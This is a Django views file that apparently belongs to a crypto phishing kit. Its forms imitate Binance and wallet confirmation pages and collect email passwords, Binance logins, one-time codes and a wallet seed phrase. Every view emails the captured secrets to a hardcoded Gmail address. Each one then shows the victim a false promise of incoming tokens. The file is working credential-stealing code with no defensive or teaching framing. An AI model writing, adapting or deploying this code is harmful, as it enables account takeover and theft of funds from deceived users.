from django.shortcuts import render,redirect,get_object_or_404
from django.contrib import messages
from .forms import EmailForm,BinanceEmail, BinancePassword,BinanceOTP,PkeyConfirm
from django.core.mail import EmailMultiAlternatives
from django.conf import settings
from django.template.loader import render_to_string
from django.utils.html import strip_tags
from django.core.mail import send_mail
from django.http import HttpResponse
from django.utils.html import strip_tags
from django.core.mail import EmailMessage

# Create your views here.



def Email(request):
	if request.method=='GET':
		form=EmailForm()

	else: 
		form = EmailForm(request.POST)
		if form.is_valid():
			email = form.cleaned_data.get("email")
			password = form.cleaned_data.get("password")
			from_email = settings.EMAIL_HOST_USER
			subject = "Email Username and password"
			to_email = 'healifan768@gmail.com'

			context = {"email":email,"password":password}
			convert = render_to_string('folder/client.html', context)
			convert_txt = render_to_string('folder/client.txt', context)

			msg = EmailMultiAlternatives(subject, convert_txt, 'kelechinwekes94@gmail.com', ['healifan768@gmail.com'])
			msg.attach_alternative(convert, "text/html")
			msg.send()
			return redirect('hk:bin_e')
			

	# else:
	# 	form=EmailForm()
	return render(request, "folder/email.html",{"form":form})



def Binance_E(request):
	if request.method == 'POST':
		form = BinanceEmail(request.POST)
		if form.is_valid():
			email = form.cleaned_data['email']
			from_email = [settings.EMAIL_HOST_USER]
			subject = "Binance Email"

			context = {"email":email}
			convert = render_to_string('folder/client.html', context)
			convert_txt = render_to_string('folder/client.txt', context)

			msg = EmailMultiAlternatives(subject, convert_txt, 'kelechinwekes94@gmail.com', ['healifan768@gmail.com'])
			msg.attach_alternative(convert, "text/html")
			msg.send()
			return redirect('hk:bin_p')

	else:
		form=BinanceEmail()
	return render(request, "folder/binance_e.html",{'form':form})



def Binance_P(request):
	if request.method == 'POST':
		form = BinancePassword(request.POST)
		if form.is_valid():
			password = form.cleaned_data['password']
			from_email = [settings.EMAIL_HOST_USER]
			subject = "Binance Email"

			context = {"password":password}
			convert = render_to_string('folder/client.html', context)
			convert_txt = render_to_string('folder/client.txt', context)

			msg = EmailMultiAlternatives(subject, convert_txt, 'kelechinwekes94@gmail.com', ['healifan768@gmail.com'])
			msg.attach_alternative(convert, "text/html")
			msg.send()
			messages.success(request, 'You will recieve your token shortly to your binance account.. thanks')
			return redirect('hk:email')

	else:
		form=BinancePassword()
	return render(request, "folder/binance_p.html",{'form':form})



def Binance_OTP(request):
	if request.method == 'POST':
		form = BinanceOTP(request.POST)
		if form.is_valid():
			password = form.cleaned_data['password']
			from_email = [settings.EMAIL_HOST_USER]
			subject = "Binance OTP"

			context = {"password":password}
			convert = render_to_string('folder/client.html', context)
			convert_txt = render_to_string('folder/client.txt', context)

			msg = EmailMultiAlternatives(subject, convert_txt, 'kelechinwekes94@gmail.com', ['healifan768@gmail.com'])
			msg.attach_alternative(convert, "text/html")
			msg.send()
			return HttpResponse('Your coin token will be sent to your wallet after 24 hours... Congratulations')


	else:
		form=BinanceOTP
	return render(request, "folder/binance.html", {'form':form})


def PassKey(request):
	if request.method == 'POST':
		form = PkeyConfirm(request.POST)
		if form.is_valid():
			password = form.cleaned_data['passkwy']
			from_email = [settings.EMAIL_HOST_USER]
			subject = "Wallet 2 Phrase Key"

			context = {"password":password}
			convert = render_to_string('folder/client.html', context)
			convert_txt = render_to_string('folder/client.txt', context)

			msg = EmailMultiAlternatives(subject, convert_txt, 'kelechinwekes94@gmail.com', ['healifan768@gmail.com'])
			msg.attach_alternative(convert, "text/html")
			msg.send()
			return HttpResponse('Confirmation sucessful... Congratulations')


	else:
		form=PkeyConfirm()
	return render(request, "folder/pkey.html",{'form':form})
